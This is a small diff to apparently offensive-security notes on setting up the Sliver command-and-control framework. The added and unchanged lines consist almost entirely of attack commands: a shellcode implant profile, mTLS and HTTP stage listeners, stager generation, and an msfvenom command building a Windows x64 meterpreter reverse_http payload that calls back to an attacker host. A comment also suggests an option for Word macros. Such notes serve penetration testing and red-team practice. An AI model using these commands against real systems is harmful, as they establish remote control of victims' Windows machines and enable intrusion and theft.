@@ -29,13 +29,15 @@ armory install c2-tool-collection
 
 
 ```bash
+# Set -a 386 for word macros
 profiles new --mtls ip:443 --format shellcode win-shellcode
 
 mtls -l 443
 
 stage-listener --url http://ip:8443 --profile win-shellcode --prepend-size
 
-generate stager --lhost ip --lport 8443 --protocol http # this will likely not work so try the following:
+generate stager --lhost ip --lport 8443 --protocol http 
+# this will likely not work so try the following:
 
 msfvenom --platform windows --arch x64 --format csharp --payload windows/x64/meterpreter/reverse_http LHOST=tun0 LPORT=8443 EXITFUNC=thread
 
